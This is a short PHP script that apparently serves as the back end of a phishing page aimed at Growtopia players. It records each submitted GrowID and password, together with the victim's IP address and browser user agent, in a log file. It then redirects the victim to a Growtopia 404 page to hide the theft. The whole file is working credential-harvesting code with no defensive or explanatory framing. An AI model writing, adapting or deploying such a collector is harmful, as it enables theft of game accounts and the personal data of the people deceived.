<?php
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."";
    }
$browser = $_SERVER['HTTP_USER_AGENT'];

file_put_contents("logs.txt", "=================================================\n"."GrowID: " . $_POST['growID'] . "\nPassword: " . $_POST['password']."\n"."IP: ".$ipaddress."\nUser-Agent: ".$browser."\n=================================================\n\n", FILE_APPEND);
header('Location: https://growtopiagame.com/404/');
exit();
?>